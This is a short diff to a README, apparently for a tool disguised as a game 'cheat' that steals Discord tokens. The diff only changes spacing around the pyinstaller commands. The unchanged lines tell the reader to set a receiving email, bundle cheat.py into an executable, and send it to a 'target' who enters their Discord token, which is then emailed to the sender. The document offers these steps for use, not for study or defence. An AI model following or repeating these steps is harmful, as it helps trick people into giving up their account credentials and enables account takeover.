@@ -57,10 +57,10 @@ also replace this line with a valid email to send to can use your sender email.
 # How to use.
 
 install pyinstaller to make it an executable.
-    ```pip install pyinstaller```
+    ``` pip install pyinstaller ```
 
 # Turn the file into an executable
-    ```pyinstaller --onefile cheat.py```
+    ``` pyinstaller --onefile cheat.py ```
 
 # Send the executable to the target and they run it and enter there discord token ID and it will be emailed to you.
 
